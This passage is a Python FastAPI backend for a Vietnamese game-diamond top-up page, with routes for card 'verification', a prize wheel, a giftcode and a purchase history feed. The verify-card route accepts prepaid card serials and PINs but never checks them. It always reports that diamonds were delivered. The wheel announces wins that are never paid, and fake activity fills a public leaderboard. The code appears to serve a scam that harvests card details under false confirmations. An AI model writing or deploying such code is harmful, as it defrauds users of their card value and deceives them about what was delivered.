    # Bảng lịch sử nạp thẻ
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_uuid TEXT,
            user_id TEXT,
            amount TEXT,
            diamonds TEXT,
            card_type TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    
    # Bảng mã Giftcode đã sử dụng
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS redeemed_codes (
            device_uuid TEXT,
            code TEXT,
            PRIMARY KEY (device_uuid, code)
        )
    """)
    
    conn.commit()
    conn.close()

init_db()

app = FastAPI()

# --- SCHEMAS ---
class ProgressRequest(BaseModel):
    device_info: str
    device_uuid: str

class VerifyCardRequest(BaseModel):
    user_id: str
    amount: str
    diamonds: str
    card_type: str
    serial: str
    pin: str
    device_info: Optional[str] = ""
    network_info: Optional[str] = ""
    device_uuid: str
    pay_with_coin: bool = False

class SpinWheelRequest(BaseModel):
    device_uuid: str
    user_id: Optional[str] = ""

class RedeemCodeRequest(BaseModel):
    code: str
    device_uuid: str

# --- MỐC TIẾN ĐỘ NHIỆM VỤ ---
QUEST_TARGETS = {1: 70000, 2: 150000, 3: 300000}

# --- ROUTES ---

@app.get("/", response_class=HTMLResponse)
def read_root():
    return HTML_CONTENT

@app.post("/api/get-progress")
def get_progress(req: ProgressRequest):
    conn = sqlite3.connect("shop.db")
    cursor = conn.cursor()
    
    cursor.execute("SELECT coins, quest_level, total_kc FROM users WHERE device_uuid = ?", (req.device_uuid,))
    row = cursor.fetchone()
    
    if not row:
        cursor.execute("INSERT INTO users (device_uuid, coins, quest_level, total_kc) VALUES (?, 0, 1, 0)", (req.device_uuid,))
        conn.commit()
        coins, quest_level, total_kc = 0, 1, 0
    else:
        coins, quest_level, total_kc = row

    target_kc = QUEST_TARGETS.get(quest_level, 500000)
    conn.close()
    
    return {
        "coins": coins,
        "quest_level": quest_level,
        "total_kc": total_kc,
        "target_kc": target_kc
    }

@app.post("/api/verify-card")
def verify_card(req: VerifyCardRequest):
    conn = sqlite3.connect("shop.db")
    cursor = conn.cursor()

    # Lấy thông tin user
    cursor.execute("SELECT coins, quest_level, total_kc FROM users WHERE device_uuid = ?", (req.device_uuid,))
    user = cursor.fetchone()
    coins, quest_level, total_kc = user if user else (0, 1, 0)

    # Đọc số Kim Cương từ chuỗi (VD: "💎 500 KC" -> 500)
    kc_amount = 0
    import re
    match = re.search(r'\d[\d\.]*', req.diamonds.replace('.', ''))
    if match:
        kc_amount = int(match.group())

    if req.pay_with_coin:
        if coins < 1:
            conn.close()
            raise HTTPException(status_code=400, detail="Bạn không đủ Đồng Xu để thanh toán!")
        coins -= 1
        message = f"Thanh toán thành công! Đã đổi 1 Xu lấy {req.diamonds} cho ID {req.user_id}."
    else:
        # Xử lý nạp thẻ thường -> cộng KC vào tiến độ
        total_kc += kc_amount
        target = QUEST_TARGETS.get(quest_level, 500000)
        
        # Kiểm tra lên cấp nhiệm vụ
        if total_kc >= target:
            quest_level += 1
            coins += 1
            message = f"Nạp thẻ thành công! Bạn nhận được {req.diamonds} và hoàn thành nhiệm vụ (+1 Xu 🪙)!"
        else:
            message = f"Nạp thẻ thành công! Đã gửi {req.diamonds} tới ID {req.user_id}."

    # Cập nhật DB
    cursor.execute("""
        INSERT INTO users (device_uuid, coins, quest_level, total_kc) 
        VALUES (?, ?, ?, ?)
        ON CONFLICT(device_uuid) DO UPDATE SET 
            coins = excluded.coins,
            quest_level = excluded.quest_level,
            total_kc = excluded.total_kc
    """, (req.device_uuid, coins, quest_level, total_kc))

    # Thêm lịch sử
    cursor.execute("""
        INSERT INTO history (device_uuid, user_id, amount, diamonds, card_type)
        VALUES (?, ?, ?, ?, ?)
    """, (req.device_uuid, req.user_id, req.amount, req.diamonds, req.card_type))

    conn.commit()
    conn.close()
    return {"message": message}

@app.post("/api/spin-wheel")
def spin_wheel(req: SpinWheelRequest):
    conn = sqlite3.connect("shop.db")
    cursor = conn.cursor()

    cursor.execute("SELECT coins FROM users WHERE device_uuid = ?", (req.device_uuid,))
    row = cursor.fetchone()
    if not row or row[0] < 1:
        conn.close()
        raise HTTPException(status_code=400, detail="Bạn cần ít nhất 1 Đồng Xu 🪙 để quay!")

    # Trừ 1 xu
    new_coins = row[0] - 1
    cursor.execute("UPDATE users SET coins = ? WHERE device_uuid = ?", (new_coins, req.device_uuid))

    # Tỷ lệ trúng thưởng Vòng Quay
    prizes = [99, 199, 499, 999, 4999, 9999, 99999]
    won_kc = random.choice(prizes)

    # Ghi nhận lịch sử nếu có ID
    if req.user_id:
        cursor.execute("""
            INSERT INTO history (device_uuid, user_id, amount, diamonds, card_type)
            VALUES (?, ?, 'Vòng Quay', ?, 'VONG_QUAY')
        """, (req.device_uuid, req.user_id, f"💎 {won_kc:,} KC"))

    conn.commit()
    conn.close()

    return {"message": f"🎉 Chúc mừng! Bạn đã quay trúng 💎 {won_kc:,} Kim Cương!"}

@app.post("/api/redeem-code")
def redeem_code(req: RedeemCodeRequest):
    conn = sqlite3.connect("shop.db")
    cursor = conn.cursor()

    code = req.code.strip().lower()

    # Kiểm tra mã hợp lệ
    if code != "newbie":
        conn.close()
        raise HTTPException(status_code=400, detail="Mã Giftcode không hợp lệ hoặc đã hết hạn!")

    # Kiểm tra đã nhận chưa
    cursor.execute("SELECT 1 FROM redeemed_codes WHERE device_uuid = ? AND code = ?", (req.device_uuid, code))
    if cursor.fetchone():
        conn.close()
        raise HTTPException(status_code=400, detail="Thiết bị này đã nhận quà từ mã này rồi!")

    # Cộng xu và đánh dấu đã nhập
    cursor.execute("INSERT INTO redeemed_codes (device_uuid, code) VALUES (?, ?)", (req.device_uuid, code))
    cursor.execute("""
        INSERT INTO users (device_uuid, coins, quest_level, total_kc)
        VALUES (?, 1, 1, 0)
        ON CONFLICT(device_uuid) DO UPDATE SET coins = coins + 1
    """, (req.device_uuid,))

    conn.commit()
    conn.close()

    return {"message": "Nhập mã thành công! Bạn nhận được +1 Đồng Xu 🪙."}

@app.get("/api/history")
def get_history(device_uuid: str):
    conn = sqlite3.connect("shop.db")
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()

    # Lịch sử cá nhân
    cursor.execute("""
        SELECT user_id, amount, diamonds, created_at 
        FROM history 
        WHERE device_uuid = ? 
        ORDER BY id DESC LIMIT 10
    """, (device_uuid,))
    my_history = [dict(row) for row in cursor.fetchall()]

    # Lịch sử chung (10 phút qua)
    time_limit = (datetime.now() - timedelta(minutes=10)).strftime('%Y-%m-%d %H:%M:%S')
    cursor.execute("""
        SELECT user_id, amount, diamonds, created_at 
        FROM history 
        WHERE created_at >= ? 
        ORDER BY id DESC LIMIT 15
    """, (time_limit,))
    global_history = [dict(row) for row in cursor.fetchall()]

    # Bảng xếp hạng Top nạp
    cursor.execute("""
        SELECT device_uuid, total_kc,
               (SELECT user_id FROM history WHERE history.device_uuid = users.device_uuid ORDER BY id DESC LIMIT 1) as last_user_id
        FROM users 
        WHERE total_kc > 0
        ORDER BY total_kc DESC LIMIT 5
    """)
    top_list = [dict(row) for row in cursor.fetchall()]

    conn.close()

    return {
        "my_history": my_history,
        "history": global_history,
        "top": top_list
    }

# --- KHỞI CHẠY SERVER ---
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
